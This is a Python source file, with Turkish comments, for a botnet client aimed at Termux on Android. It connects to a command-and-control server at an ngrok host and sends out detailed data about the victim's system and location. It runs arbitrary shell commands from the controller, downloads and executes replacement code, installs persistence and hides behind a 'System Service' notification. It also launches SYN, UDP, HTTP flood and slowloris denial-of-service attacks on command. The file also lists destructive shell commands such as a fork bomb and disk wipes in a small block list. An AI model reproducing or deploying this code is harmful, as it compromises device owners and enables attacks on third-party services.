#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TERMUX BOTNET CLIENT v3.2
Tam otomatik C2 bağlantılı bot istemcisi
"""

import socket
import threading
import time
import json
import sys
import os
import subprocess
import platform
import random
import ssl
import hashlib
import base64
import zlib
import signal
import urllib.request
import urllib.error
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Modülleri import et
try:
    from modules.attack import AttackModules
    from modules.scanner import NetworkScanner
    from modules.persistence import PersistenceManager
    MODULES_LOADED = True
except ImportError:
    MODULES_LOADED = False
    print("[!] Modüller yüklenemedi, bazı özellikler devre dışı")

class TermuxBotClient:
    def __init__(self, config_file="config.json"):
        # Config yükle
        self.config = self.load_config(config_file)
        
        # C2 ayarları
        self.c2_host = self.config.get('c2_server', '0.tcp.eu.ngrok.io')
        self.c2_port = self.config.get('c2_port', 12345)
        self.encryption_key = self.config.get('encryption_key', '')
        self.reconnect_delay = self.config.get('reconnect_delay', 30)
        
        # Bot kimliği
        self.bot_id = self.generate_bot_id()
        self.session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:12]
        
        # Durum değişkenleri
        self.running = True
        self.connected = False
        self.attack_threads = []
        self.active_attacks = {}
        self.command_queue = []
        
        # Modüller
        if MODULES_LOADED:
            self.attacker = AttackModules(max_threads=200)
            self.scanner = NetworkScanner()
            self.persistence = PersistenceManager(sys.argv[0])
        else:
            self.attacker = None
            self.scanner = None
            self.persistence = None
        
        # Thread pool
        self.executor = ThreadPoolExecutor(max_workers=50)
        
        # SSL context
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
        # Termux optimizasyonları
        self.termux_mode = 'com.termux' in os.getcwd() if os.getcwd() else False
        self.setup_termux()
        
        # Log dosyası
        self.log_file = "/data/data/com.termux/files/home/botnet.log"
        
        print(f"[+] Bot başlatıldı: {self.bot_id}")
        print(f"[+] C2: {self.c2_host}:{self.c2_port}")
        print(f"[+] Termux Modu: {self.termux_mode}")
    
    def load_config(self, config_file):
        """Config dosyasını yükle"""
        default_config = {
            'c2_server': '0.tcp.eu.ngrok.io',
            'c2_port': 12345,
            'encryption_key': '',
            'reconnect_delay': 30,
            'max_bots': 1000,
            'attack_methods': {
                'tcp_flood': True,
                'udp_flood': True,
                'http_flood': True,
                'slowloris': True,
                'dns_amplification': False,
                'icmp_flood': False,
                'mixed_attack': True
            },
            'scanner_enabled': True,
            'persistence_enabled': True,
            'auto_update': True,
            'debug_mode': False
        }
        
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except:
            pass
        
        return default_config
    
    def generate_bot_id(self):
        """Benzersiz bot ID oluştur"""
        system_info = platform.node() + platform.platform()
        random_part = os.urandom(8).hex()
        bot_hash = hashlib.sha256((system_info + random_part).encode()).hexdigest()[:16]
        
        if self.termux_mode:
            return f"T-{bot_hash[:12]}"
        else:
            return f"B-{bot_hash[:12]}"
    
    def setup_termux(self):
        """Termux özel ayarlar"""
        if not self.termux_mode:
            return
        
        try:
            # Wake lock (ekran kapalıyken çalış)
            os.system('termux-wake-lock 2>/dev/null')
            
            # Battery optimizasyonu
            os.system('termux-battery-status 2>/dev/null')
            
            # Notification channel
            os.system('termux-notification --id botnet --title "System Service" --content "Background service running" 2>/dev/null')
            
            # Storage izni
            if not os.path.exists('/data/data/com.termux/files/home/storage'):
                os.system('termux-setup-storage 2>/dev/null')
            
            # Keep alive
            self.executor.submit(self.keep_alive_termux)
            
        except Exception as e:
            self.log_error(f"Termux setup error: {e}")
    
    def keep_alive_termux(self):
        """Termux'u canlı tut"""
        while self.running:
            try:
                # Her 5 dakikada bir ping
                os.system('termux-wake-lock 2>/dev/null')
                time.sleep(300)
            except:
                pass
    
    def encrypt_data(self, data):
        """Veriyi şifrele"""
        if not self.encryption_key:
            return base64.b64encode(data.encode()).decode()
        
        try:
            # Basit XOR şifreleme
            key = self.encryption_key.encode()
            data_bytes = data.encode()
            encrypted = bytearray()
            
            for i in range(len(data_bytes)):
                encrypted.append(data_bytes[i] ^ key[i % len(key)])
            
            return base64.b64encode(encrypted).decode()
        except:
            return base64.b64encode(data.encode()).decode()
    
    def decrypt_data(self, encrypted_data):
        """Veriyi çöz"""
        if not self.encryption_key:
            return base64.b64decode(encrypted_data).decode()
        
        try:
            encrypted_bytes = base64.b64decode(encrypted_data)
            key = self.encryption_key.encode()
            decrypted = bytearray()
            
            for i in range(len(encrypted_bytes)):
                decrypted.append(encrypted_bytes[i] ^ key[i % len(key)])
            
            return decrypted.decode()
        except:
            return base64.b64decode(encrypted_data).decode()
    
    def get_system_info(self):
        """Detaylı sistem bilgisi"""
        info = {
            'bot_id': self.bot_id,
            'session_id': self.session_id,
            'platform': platform.platform(),
            'system': platform.system(),
            'hostname': socket.gethostname(),
            'python_version': sys.version.split()[0],
            'termux': self.termux_mode,
            'architecture': platform.architecture()[0],
            'processor': platform.processor() or 'unknown',
            'cores': os.cpu_count() or 1,
            'ram': self.get_memory_info(),
            'storage': self.get_storage_info(),
            'network': self.get_network_info(),
            'uptime': self.get_uptime(),
            'processes': self.get_running_processes(),
            'location': self.get_approximate_location(),
            'timestamp': datetime.now().isoformat(),
            'config': {
                'c2_host': self.c2_host,
                'c2_port': self.c2_port,
                'modules_loaded': MODULES_LOADED
            }
        }
        
        # Termux özel bilgiler
        if self.termux_mode:
            info['termux_packages'] = self.get_termux_packages()
            info['termux_version'] = self.get_termux_version()
        
        return info
    
    def get_memory_info(self):
        """RAM bilgisi"""
        try:
            if platform.system() == 'Linux':
                with open('/proc/meminfo', 'r') as f:
                    for line in f:
                        if 'MemTotal' in line:
                            return line.strip()
            elif platform.system() == 'Windows':
                import ctypes
                class MEMORYSTATUSEX(ctypes.Structure):
                    _fields_ = [
                        ('dwLength', ctypes.c_ulong),
                        ('dwMemoryLoad', ctypes.c_ulong),
                        ('ullTotalPhys', ctypes.c_ulonglong),
                        ('ullAvailPhys', ctypes.c_ulonglong),
                        ('ullTotalPageFile', ctypes.c_ulonglong),
                        ('ullAvailPageFile', ctypes.c_ulonglong),
                        ('ullTotalVirtual', ctypes.c_ulonglong),
                        ('ullAvailVirtual', ctypes.c_ulonglong),
                        ('ullAvailExtendedVirtual', ctypes.c_ulonglong)
                    ]
                
                memory_status = MEMORYSTATUSEX()
                memory_status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
                ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memory_status))
                return f"Total: {memory_status.ullTotalPhys // (1024**2)} MB"
        except:
            pass
        return "Unknown"
    
    def get_storage_info(self):
        """Disk bilgisi"""
        try:
            if platform.system() == 'Linux':
                result = subprocess.check_output(['df', '-h', '/']).decode()
                return result.split('\n')[1].split()[1:4]
        except:
            pass
        return ["Unknown", "Unknown", "Unknown"]
    
    def get_network_info(self):
        """Ağ bilgisi"""
        info = {
            'local_ip': socket.gethostbyname(socket.gethostname()),
            'public_ip': self.get_public_ip(),
            'interfaces': []
        }
        
        try:
            import netifaces
            for interface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    for addr in addrs[netifaces.AF_INET]:
                        info['interfaces'].append({
                            'interface': interface,
                            'ip': addr.get('addr'),
                            'netmask': addr.get('netmask')
                        })
        except:
            pass
        
        return info
    
    def get_public_ip(self):
        """Public IP al"""
        services = [
            'https://api.ipify.org',
            'https://icanhazip.com',
            'https://ident.me'
        ]
        
        for service in services:
            try:
                response = urllib.request.urlopen(service, timeout=5)
                return response.read().decode().strip()
            except:
                continue
        
        return "Unknown"
    
    def get_uptime(self):
        """Sistem uptime"""
        try:
            if platform.system() == 'Linux':
                with open('/proc/uptime', 'r') as f:
                    uptime_seconds = float(f.readline().split()[0])
                    return str(int(uptime_seconds))
            elif platform.system() == 'Windows':
                import ctypes
                lib = ctypes.windll.kernel32
                tick = lib.GetTickCount64()
                return str(tick // 1000)
        except:
            pass
        return "Unknown"
    
    def get_running_processes(self):
        """Çalışan prosesler"""
        processes = []
        try:
            if platform.system() == 'Windows':
                output = subprocess.check_output(['tasklist', '/fo', 'csv'], shell=True).decode()
                lines = output.split('\n')[1:6]  # İlk 5 process
                for line in lines:
                    if line:
                        parts = line.split(',')
                        if len(parts) >= 2:
                            processes.append({
                                'name': parts[0].strip('"'),
                                'pid': parts[1].strip('"')
                            })
            else:
                output = subprocess.check_output(['ps', 'aux'], shell=True).decode()
                lines = output.split('\n')[1:6]
                for line in lines:
                    if line:
                        parts = line.split()
                        if len(parts) >= 2:
                            processes.append({
                                'name': parts[10][:20] if len(parts) > 10 else parts[0],
                                'pid': parts[1]
                            })
        except:
            pass
        
        return processes
    
    def get_approximate_location(self):
        """Yaklaşık konum (IP based)"""
        try:
            response = urllib.request.urlopen('https://ipapi.co/json/', timeout=5)
            data = json.loads(response.read().decode())
            return {
                'country': data.get('country_name'),
                'city': data.get('city'),
                'isp': data.get('org')
            }
        except:
            return {'country': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown'}
    
    def get_termux_packages(self):
        """Termux paketleri"""
        try:
            output = subprocess.check_output(['pkg', 'list-installed'], shell=True).decode()
            packages = []
            for line in output.split('\n'):
                if '/' in line:
                    packages.append(line.split('/')[0])
            return packages[:10]  # İlk 10 paket
        except:
            return []
    
    def get_termux_version(self):
        """Termux versiyonu"""
        try:
            output = subprocess.check_output(['termux-info'], shell=True).decode()
            for line in output.split('\n'):
                if 'Termux' in line:
                    return line.strip()
        except:
            pass
        return "Unknown"
    
    def log_error(self, message):
        """Hata logu"""
        try:
            with open(self.log_file, 'a') as f:
                f.write(f"[{datetime.now().isoformat()}] ERROR: {message}\n")
        except:
            pass
    
    def log_activity(self, message):
        """Aktivite logu"""
        try:
            with open(self.log_file, 'a') as f:
                f.write(f"[{datetime.now().isoformat()}] INFO: {message}\n")
        except:
            pass
    
    def connect_to_c2(self):
        """C2'ye bağlan"""
        attempts = 0
        max_attempts = 10
        
        while self.running and attempts < max_attempts:
            try:
                self.log_activity(f"C2 bağlantısı deniyor: {self.c2_host}:{self.c2_port}")
                
                # Raw socket
                raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                raw_socket.settimeout(30)
                
                # SSL wrapper
                ssl_socket = self.ssl_context.wrap_socket(raw_socket)
                ssl_socket.connect((self.c2_host, self.c2_port))
                
                self.connected = True
                self.log_activity("C2'ye bağlandı")
                return ssl_socket
                
            except Exception as e:
                attempts += 1
                error_msg = f"C2 bağlantı hatası ({attempts}/{max_attempts}): {str(e)[:50]}"
                self.log_error(error_msg)
                
                if attempts < max_attempts:
                    wait_time = self.reconnect_delay * attempts
                    self.log_activity(f"{wait_time} saniye sonra tekrar denenecek")
                    time.sleep(wait_time)
        
        return None
    
    def send_heartbeat(self, socket_conn):
        """Kalp atışı gönder"""
        heartbeat = {
            'type': 'heartbeat',
            'bot_id': self.bot_id,
            'timestamp': time.time(),
            'status': 'active',
            'attacks': len(self.active_attacks)
        }
        
        try:
            encoded = self.encrypt_data(json.dumps(heartbeat))
            socket_conn.send(f"HEARTBEAT:{encoded}\n".encode())
            return True
        except:
            return False
    
    def execute_command(self, command_data):
        """Komut çalıştır"""
        cmd_type = command_data.get('type', 'unknown')
        cmd_id = command_data.get('cmd_id', 'unknown')
        
        self.log_activity(f"Komut çalıştırılıyor: {cmd_type} ({cmd_id})")
        
        try:
            if cmd_type == 'attack':
                return self.execute_attack(command_data)
            
            elif cmd_type == 'scan':
                return self.execute_scan(command_data)
            
            elif cmd_type == 'system':
                return self.execute_system_command(command_data)
            
            elif cmd_type == 'update':
                return self.execute_update(command_data)
            
            elif cmd_type == 'persistence':
                return self.execute_persistence(command_data)
            
            elif cmd_type == 'stop':
                return self.execute_stop(command_data)
            
            elif cmd_type == 'info':
                return {'status': 'success', 'info': self.get_system_info()}
            
            else:
                return {'status': 'error', 'message': f'Unknown command type: {cmd_type}'}
                
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def execute_attack(self, command_data):
        """Saldırı komutunu çalıştır"""
        if not self.attacker:
            return {'status': 'error', 'message': 'Attack module not loaded'}
        
        method = command_data.get('method', 'tcp_flood')
        target = command_data['target']
        port = command_data.get('port', 80)
        duration = command_data.get('duration', 60)
        threads = command_data.get('threads', 50)
        
        attack_id = hashlib.md5(f"{method}{target}{time.time()}".encode()).hexdigest()[:8]
        
        def run_attack():
            try:
                if method == 'tcp_flood':
                    result = self.attacker.tcp_syn_flood(target, port, duration, threads)
                elif method == 'udp_flood':
                    result = self.attacker.udp_flood(target, port, duration, threads)
                elif method == 'http_flood':
                    url = f"http://{target}:{port}" if '://' not in target else target
                    result = self.attacker.http_flood(url, duration)
                elif method == 'slowloris':
                    result = self.attacker.slowloris(target, port, duration, threads)
                elif method == 'mixed_attack':
                    result = self.attacker.mixed_attack(target, port, duration)
                else:
                    result = f"Unknown attack method: {method}"
                
                # Attack tamamlandı, listeden çıkar
                if attack_id in self.active_attacks:
                    del self.active_attacks[attack_id]
                
                return {'status': 'completed', 'result': result}
                
            except Exception as e:
                if attack_id in self.active_attacks:
                    del self.active_attacks[attack_id]
                return {'status': 'error', 'message': str(e)}
        
        # Attack'ı thread'de başlat
        attack_thread = threading.Thread(target=run_attack)
        attack_thread.daemon = True
        attack_thread.start()
        
        # Active attacks'a ekle
        self.active_attacks[attack_id] = {
            'method': method,
            'target': target,
            'start_time': time.time(),
            'thread': attack_thread
        }
        
        return {'status': 'started', 'attack_id': attack_id}
    
    def execute_scan(self, command_data):
        """Tarama komutunu çalıştır"""
        if not self.scanner:
            return {'status': 'error', 'message': 'Scanner module not loaded'}
        
        scan_type = command_data.get('scan_type', 'network')
        
        if scan_type == 'network':
            network = command_data.get('network', '192.168.1.0/24')
            ports = command_data.get('ports', [22, 80, 443, 3389])
            results = self.scanner.scan_network(network, ports)
            return {'status': 'success', 'results': results}
        
        elif scan_type == 'ports':
            target = command_data.get('target')
            ports = command_data.get('ports', list(range(1, 1001)))
            results = self.scanner.scan_ports(target, ports)
            return {'status': 'success', 'results': results}
        
        elif scan_type == 'vulnerability':
            target = command_data.get('target')
            port = command_data.get('port', 80)
            results = self.scanner.vulnerability_scan(target, port)
            return {'status': 'success', 'results': results}
        
        else:
            return {'status': 'error', 'message': f'Unknown scan type: {scan_type}'}
    
    def execute_system_command(self, command_data):
        """Sistem komutu çalıştır"""
        cmd = command_data.get('command', '')
        
        if not cmd:
            return {'status': 'error', 'message': 'No command provided'}
        
        try:
            # Güvenlik kontrolü
            dangerous_cmds = ['rm -rf', 'format', 'dd if=', ':(){:|:&};:', 'mkfs']
            for dangerous in dangerous_cmds:
                if dangerous in cmd.lower():
                    return {'status': 'error', 'message': 'Dangerous command blocked'}
            
            # Komutu çalıştır
            result = subprocess.check_output(
                cmd,
                shell=True,
                stderr=subprocess.STDOUT,
                timeout=command_data.get('timeout', 30)
            ).decode('utf-8', errors='ignore')
            
            return {'status': 'success', 'output': result}
            
        except subprocess.TimeoutExpired:
            return {'status': 'error', 'message': 'Command timeout'}
        except subprocess.CalledProcessError as e:
            return {'status': 'error', 'message': f'Command failed: {e.output.decode()[:100]}'}
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def execute_update(self, command_data):
        """Kendini güncelle"""
        update_url = command_data.get('url', '')
        
        if not update_url:
            return {'status': 'error', 'message': 'No update URL provided'}
        
        try:
            # Yeni bot'u indir
            response = urllib.request.urlopen(update_url, timeout=30)
            new_bot = response.read()
            
            # Kendini değiştir
            current_path = sys.argv[0]
            backup_path = f"{current_path}.backup"
            
            # Backup al
            with open(current_path, 'rb') as f:
                current_bot = f.read()
            with open(backup_path, 'wb') as f:
                f.write(current_bot)
            
            # Yeni bot'u yaz
            with open(current_path, 'wb') as f:
                f.write(new_bot)
            
            os.chmod(current_path, 0o755)
            
            # Yeniden başlat
            self.log_activity("Update completed, restarting...")
            time.sleep(1)
            os.execv(sys.executable, [sys.executable, current_path])
            
            return {'status': 'updating'}
            
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def execute_persistence(self, command_data):
        """Kalıcılık kur"""
        if not self.persistence:
            return {'status': 'error', 'message': 'Persistence module not loaded'}
        
        action = command_data.get('action', 'install')
        
        if action == 'install':
            methods = self.persistence.install_all()
            return {'status': 'success', 'methods': methods}
        
        elif action == 'uninstall':
            removed = self.persistence.uninstall()
            return {'status': 'success', 'removed': removed}
        
        elif action == 'check':
            return {'status': 'success', 'persistence': 'enabled'}
        
        else:
            return {'status': 'error', 'message': f'Unknown action: {action}'}
    
    def execute_stop(self, command_data):
        """Saldırıları durdur"""
        stop_type = command_data.get('stop_type', 'all')
        
        if stop_type == 'all':
            if self.attacker:
                self.attacker.stop_all_attacks()
            self.active_attacks.clear()
            return {'status': 'success', 'message': 'All attacks stopped'}
        
        elif stop_type == 'specific':
            attack_id = command_data.get('attack_id')
            if attack_id in self.active_attacks:
                # Attack thread'ini durdur (basit yöntem)
                del self.active_attacks[attack_id]
                return {'status': 'success', 'message': f'Attack {attack_id} stopped'}
            else:
                return {'status': 'error', 'message': f'Attack {attack_id} not found'}
        
        else:
            return {'status': 'error', 'message': f'Unknown stop type: {stop_type}'}
    
    def handle_c2_communication(self, socket_conn):
        """C2 ile iletişimi yönet"""
        last_heartbeat = time.time()
        
        try:
            while self.running and self.connected:
                # Heartbeat gönder (her 60 saniyede bir)
                if time.time() - last_heartbeat > 60:
                    if not self.send_heartbeat(socket_conn):
                        self.log_error("Heartbeat gönderilemedi")
                        break
                    last_heartbeat = time.time()
                
                # Veri al
                try:
                    socket_conn.settimeout(5)
                    data = socket_conn.recv(4096)
                    
                    if not data:
                        self.log_activity("C2 bağlantısı kapandı")
                        break
                    
                    # Veriyi işle
                    self.process_received_data(data, socket_conn)
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    self.log_error(f"Veri alma hatası: {e}")
                    break
                
        except Exception as e:
            self.log_error(f"C2 iletişim hatası: {e}")
        finally:
            self.connected = False
            try:
                socket_conn.close()
            except:
                pass
    
    def process_received_data(self, data, socket_conn):
        """Alınan veriyi işle"""
        try:
            # Veriyi satırlara ayır
            lines = data.decode('utf-8', errors='ignore').strip().split('\n')
            
            for line in lines:
                if not line.strip():
                    continue
                
                # Komut formatı: COMMAND_TYPE:ENCRYPTED_DATA
                if ':' in line:
                    cmd_type, encrypted_data = line.split(':', 1)
                    
                    if cmd_type == 'COMMAND':
                        # Komutu çöz ve çalıştır
                        decrypted = self.decrypt_data(encrypted_data)
                        command_data = json.loads(decrypted)
                        
                        # Komutu çalıştır
                        result = self.execute_command(command_data)
                        
                        # Sonucu C2'ye gönder
                        response = {
                            'type': 'command_result',
                            'cmd_id': command_data.get('cmd_id', 'unknown'),
                            'bot_id': self.bot_id,
                            'result': result,
                            'timestamp': time.time()
                        }
                        
                        encoded_response = self.encrypt_data(json.dumps(response))
                        socket_conn.send(f"RESULT:{encoded_response}\n".encode())
                    
                    elif cmd_type == 'PING':
                        # Ping'e pong ile cevap ver
                        socket_conn.send(b"PONG\n")
                    
                    elif cmd_type == 'INFO_REQUEST':
                        # Sistem bilgisi gönder
                        info = self.get_system_info()
                        encoded_info = self.encrypt_data(json.dumps(info))
                        socket_conn.send(f"INFO:{encoded_info}\n".encode())
                    
                    elif cmd_type == 'UPDATE':
                        # Güncelleme komutu
                        update_data = json.loads(self.decrypt_data(encrypted_data))
                        result = self.execute_update(update_data)
                        
                        response = {
                            'type': 'update_result',
                            'result': result
                        }
                        encoded_response = self.encrypt_data(json.dumps(response))
                        socket_conn.send(f"RESULT:{encoded_response}\n".encode())
        
        except json.JSONDecodeError as e:
            self.log_error(f"JSON decode error: {e}")
        except Exception as e:
            self.log_error(f"Data processing error: {e}")
    
    def main_loop(self):
        """Ana döngü"""
        self.log_activity("Bot başlatıldı")
        
        # Kalıcılık kur (eğer aktifse)
        if self.config.get('persistence_enabled', True) and self.persistence:
            try:
                self.persistence.install_all()
                self.log_activity("Persistence installed")
            except Exception as e:
                self.log_error(f"Persistence error: {e}")
        
        # Ana bağlantı döngüsü
        while self.running:
            try:
                # C2'ye bağlan
                socket_conn = self.connect_to_c2()
                
                if socket_conn:
                    # Bağlantı kuruldu, bilgileri gönder
                    info = self.get_system_info()
                    encoded_info = self.encrypt_data(json.dumps(info))
                    socket_conn.send(f"CONNECT:{encoded_info}\n".encode())
                    
                    # İletişimi başlat
                    self.handle_c2_communication(socket_conn)
                
                # Yeniden bağlanmadan önce bekle
                if self.running:
                    self.log_activity(f"Yeniden bağlanmadan önce {self.reconnect_delay} saniye bekleniyor")
                    time.sleep(self.reconnect_delay)
                    
            except KeyboardInterrupt:
                self.log_activity("Keyboard interrupt received")
                self.running = False
                break
                
            except Exception as e:
                self.log_error(f"Main loop error: {e}")
                if self.running:
                    time.sleep(self.reconnect_delay * 2)
        
        # Temizlik
        self.cleanup()
        self.log_activity("Bot durduruldu")
    
    def cleanup(self):
        """Temizlik işlemleri"""
        self.log_activity("Cleaning up...")
        
        # Attack'ları durdur
        if self.attacker:
            self.attacker.stop_all_attacks()
        
        # Thread pool'u kapat
        self.executor.shutdown(wait=False)
        
        # Termux wake lock'u kaldır
        if self.termux_mode:
            try:
                os.system('termux-wake-unlock 2>/dev/null')
            except:
                pass
    
    def signal_handler(self, signum, frame):
        """Sinyal handler"""
        self.log_activity(f"Signal {signum} received")
        self.running = False

def main():
    """Ana fonksiyon"""
    # Sinyal handler'ları
    bot = TermuxBotClient()
    
    signal.signal(signal.SIGINT, bot.signal_handler)
    signal.signal(signal.SIGTERM, bot.signal_handler)
    
    # Ana döngüyü başlat
    try:
        bot.main_loop()
    except Exception as e:
        bot.log_error(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    # Çalışma dizinini değiştir (Termux için)
    if 'com.termux' in os.getcwd():
        os.chdir('/data/data/com.termux/files/home')
    
    # Argüman kontrolü
    if len(sys.argv) > 1 and sys.argv[1] == '--debug':
        print("[DEBUG MODE]")
        client = TermuxBotClient()
        print(json.dumps(client.get_system_info(), indent=2))
    else:
        main()
